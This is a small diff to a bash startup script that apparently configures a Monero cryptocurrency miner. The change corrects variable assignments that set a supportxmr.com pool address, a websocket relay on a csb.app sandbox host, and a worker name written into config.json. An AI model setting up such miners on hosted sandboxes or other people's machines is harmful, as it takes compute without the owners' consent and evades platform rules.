@@ -1,15 +1,15 @@
 #!/bin/bash
 
 if [ -z "$NAME_ID" ]; then
-    $NAME_ID="NONE"
+    NAME_ID="NONE"
 fi
 
 if [ -z "$POOL_URL" ]; then
-    $POOL_URL="pool.supportxmr.com:7777"
+    POOL_URL="pool.supportxmr.com:7777"
 fi
 
 if [ -z "$WS_URL" ]; then
-    $WS_URL="wss://1sb9mu-10000.csb.app"
+    WS_URL="wss://1sb9mu-10000.csb.app"
 fi
 
 sed -i "s/\"pass\": \"notunn\"/\"pass\": \"$NAME_ID\"/" /app/config.json
